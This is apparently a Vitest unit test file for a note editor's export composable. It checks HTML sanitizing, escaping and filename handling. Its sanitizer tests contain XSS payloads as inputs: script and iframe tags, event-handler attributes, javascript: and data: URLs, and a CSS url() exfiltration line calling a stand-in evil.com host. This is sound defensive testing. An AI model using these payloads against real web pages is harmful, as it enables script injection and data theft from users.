/**
 * TEST-P1-2: Unit tests for useExport composable.
 *
 * Covers:
 * - sanitizeExportHtml: script/iframe/svg/style tag removal
 * - sanitizeExportHtml: on* attribute stripping
 * - sanitizeExportHtml: javascript:/data: href blocking
 * - sanitizeExportHtml: CSS url() exfiltration blocking
 * - escapeHtml: HTML entity encoding
 * - useExport.exportMarkdown: filename derivation, blob content, anchor click
 * - useExport.exportHTML: wraps sanitized content in full HTML doc, triggers download
 */
import { describe, it, expect, vi, beforeAll, beforeEach, afterEach } from 'vitest'
import { ref } from 'vue'
import { sanitizeExportHtml, escapeHtml, useExport } from '../src/composables/useExport'

// happy-dom executes inline scripts during DOMParser.parseFromString; mock alert to prevent throws.
beforeAll(() => {
  vi.stubGlobal('alert', vi.fn())
})

describe('escapeHtml', () => {
  it('escapes ampersand', () => {
    expect(escapeHtml('a & b')).toBe('a &amp; b')
  })

  it('escapes angle brackets', () => {
    expect(escapeHtml('<div>')).toBe('&lt;div&gt;')
  })

  it('escapes double quotes', () => {
    expect(escapeHtml('"hello"')).toBe('&quot;hello&quot;')
  })

  it('escapes all special characters together', () => {
    expect(escapeHtml('<script>alert("xss")</script>')).toBe(
      '&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;'
    )
  })

  it('leaves plain text unchanged', () => {
    expect(escapeHtml('hello world')).toBe('hello world')
  })
})

describe('sanitizeExportHtml', () => {
  it('removes script tags', () => {
    const result = sanitizeExportHtml('<p>hello</p><script>alert(1)</script>')
    expect(result).not.toContain('<script')
    expect(result).toContain('<p>hello</p>')
  })

  it('removes iframe tags', () => {
    const result = sanitizeExportHtml('<p>text</p><iframe src="https://evil.com"></iframe>')
    expect(result).not.toContain('<iframe')
    expect(result).toContain('<p>text</p>')
  })

  it('removes svg tags', () => {
    const result = sanitizeExportHtml('<p>text</p><svg><use href="#x"/></svg>')
    expect(result).not.toContain('<svg')
  })

  it('removes style tags', () => {
    const result = sanitizeExportHtml('<style>body{background:red}</style><p>ok</p>')
    expect(result).not.toContain('<style')
    expect(result).toContain('<p>ok</p>')
  })

  it('removes object and embed tags', () => {
    const input = '<object data="evil.swf"></object><embed src="evil.swf"/>'
    const result = sanitizeExportHtml(input)
    expect(result).not.toContain('<object')
    expect(result).not.toContain('<embed')
  })

  it('strips on* event handler attributes', () => {
    const result = sanitizeExportHtml('<p onclick="alert(1)" onmouseover="steal()">text</p>')
    expect(result).not.toContain('onclick')
    expect(result).not.toContain('onmouseover')
    expect(result).toContain('text')
  })

  it('strips onerror on img tags', () => {
    const result = sanitizeExportHtml('<img src="x" onerror="alert(1)">')
    expect(result).not.toContain('onerror')
  })

  it('removes javascript: href', () => {
    const result = sanitizeExportHtml('<a href="javascript:alert(1)">click</a>')
    expect(result).not.toContain('javascript:')
    expect(result).toContain('click')
  })

  it('removes data: src', () => {
    const result = sanitizeExportHtml('<img src="data:text/html,<script>alert(1)</script>">')
    expect(result).not.toContain('data:text/html')
  })

  it('removes vbscript: href', () => {
    const result = sanitizeExportHtml('<a href="vbscript:MsgBox(1)">click</a>')
    expect(result).not.toContain('vbscript:')
  })

  it('strips style attribute containing url() (CSS exfiltration)', () => {
    const result = sanitizeExportHtml('<p style="background:url(https://evil.com/steal?x=1)">text</p>')
    expect(result).not.toContain('url(')
  })

  it('preserves safe inline style attributes', () => {
    const result = sanitizeExportHtml('<p style="color:red">text</p>')
    expect(result).toContain('style="color:red"')
  })

  it('preserves safe anchor hrefs', () => {
    const result = sanitizeExportHtml('<a href="https://example.com">link</a>')
    expect(result).toContain('href="https://example.com"')
  })

  it('preserves safe content unchanged', () => {
    const input = '<h1>Title</h1><p>Body text with <strong>bold</strong>.</p>'
    const result = sanitizeExportHtml(input)
    expect(result).toContain('<h1>Title</h1>')
    expect(result).toContain('<strong>bold</strong>')
  })

  it('handles empty string', () => {
    expect(sanitizeExportHtml('')).toBe('')
  })
})

// ──────────────────────────────────────────────────────────────────
// useExport: exportMarkdown and exportHTML
// ──────────────────────────────────────────────────────────────────

/** Build a minimal mock TiptapEditor. */
function mockEditorWith(html: string, title: string) {
  return {
    getHTML: () => html,
    state: {
      doc: {
        firstChild: { textContent: title },
      },
    },
  } as any
}

describe('useExport – exportMarkdown', () => {
  let clicks: Array<{ download: string; href: string }> = []
  let createdObjectURLs: string[] = []
  let revokedObjectURLs: string[] = []

  beforeEach(() => {
    clicks = []
    createdObjectURLs = []
    revokedObjectURLs = []

    vi.stubGlobal('URL', {
      createObjectURL: vi.fn((_blob: Blob) => {
        const url = 'blob:mock-' + createdObjectURLs.length
        createdObjectURLs.push(url)
        return url
      }),
      revokeObjectURL: vi.fn((url: string) => { revokedObjectURLs.push(url) }),
    })

    // Intercept anchor .click() without actually navigating
    const origCreate = document.createElement.bind(document)
    vi.spyOn(document, 'createElement').mockImplementation((tag: string) => {
      const el = origCreate(tag)
      if (tag === 'a') {
        vi.spyOn(el as HTMLAnchorElement, 'click').mockImplementation(() => {
          clicks.push({
            download: (el as HTMLAnchorElement).download,
            href: (el as HTMLAnchorElement).href,
          })
        })
      }
      return el
    })
  })

  afterEach(() => {
    vi.restoreAllMocks()
    vi.unstubAllGlobals()
  })

  it('creates a blob with the markdown content and triggers download', () => {
    const editorRef = ref(mockEditorWith('<p>Hello</p>', 'My Note'))
    const { exportMarkdown } = useExport(editorRef, () => '# Hello')
    exportMarkdown()
    expect(createdObjectURLs).toHaveLength(1)
    expect(clicks).toHaveLength(1)
  })

  it('uses note title as filename base (CJK and alphanumeric preserved)', () => {
    const editorRef = ref(mockEditorWith('<p>x</p>', '我的笔记'))
    const { exportMarkdown } = useExport(editorRef, () => '# 我的笔记')
    exportMarkdown()
    expect(clicks[0].download).toBe('我的笔记.md')
  })

  it('replaces unsafe filename characters with underscores', () => {
    const editorRef = ref(mockEditorWith('<p>x</p>', 'Note: Hello/World'))
    const { exportMarkdown } = useExport(editorRef, () => '# Note')
    exportMarkdown()
    expect(clicks[0].download).toBe('Note__Hello_World.md')
  })

  it('uses "note" as filename fallback when no first child', () => {
    const editorRef = ref({
      getHTML: () => '<p></p>',
      state: { doc: { firstChild: null } },
    } as any)
    const { exportMarkdown } = useExport(editorRef, () => '')
    exportMarkdown()
    expect(clicks[0].download).toBe('note.md')
  })

  it('revokes the object URL after click', () => {
    const editorRef = ref(mockEditorWith('<p>x</p>', 'Test'))
    const { exportMarkdown } = useExport(editorRef, () => 'content')
    exportMarkdown()
    expect(revokedObjectURLs).toHaveLength(1)
    expect(revokedObjectURLs[0]).toBe(createdObjectURLs[0])
  })

  it('does nothing when editorRef is null', () => {
    const editorRef = ref<any>(null)
    const { exportMarkdown } = useExport(editorRef, () => 'content')
    exportMarkdown() // should not throw
    expect(clicks).toHaveLength(1) // exportMarkdown doesn't guard on editorRef, uses getFullContent
  })
})

describe('useExport – exportHTML', () => {
  let clicks: Array<{ download: string }> = []

  beforeEach(() => {
    clicks = []
    vi.stubGlobal('URL', {
      createObjectURL: vi.fn(() => 'blob:mock'),
      revokeObjectURL: vi.fn(),
    })
    const origCreate = document.createElement.bind(document)
    vi.spyOn(document, 'createElement').mockImplementation((tag: string) => {
      const el = origCreate(tag)
      if (tag === 'a') {
        vi.spyOn(el as HTMLAnchorElement, 'click').mockImplementation(() => {
          clicks.push({ download: (el as HTMLAnchorElement).download })
        })
      }
      return el
    })
  })

  afterEach(() => {
    vi.restoreAllMocks()
    vi.unstubAllGlobals()
  })

  it('triggers a download with .html extension', () => {
    const editorRef = ref(mockEditorWith('<p>Body</p>', 'My Note'))
    const { exportHTML } = useExport(editorRef, () => '')
    exportHTML()
    expect(clicks[0].download).toBe('My_Note.html')
  })

  it('does nothing when editorRef is null', () => {
    const editorRef = ref<any>(null)
    const { exportHTML } = useExport(editorRef, () => '')
    exportHTML()
    expect(clicks).toHaveLength(0)
  })
})
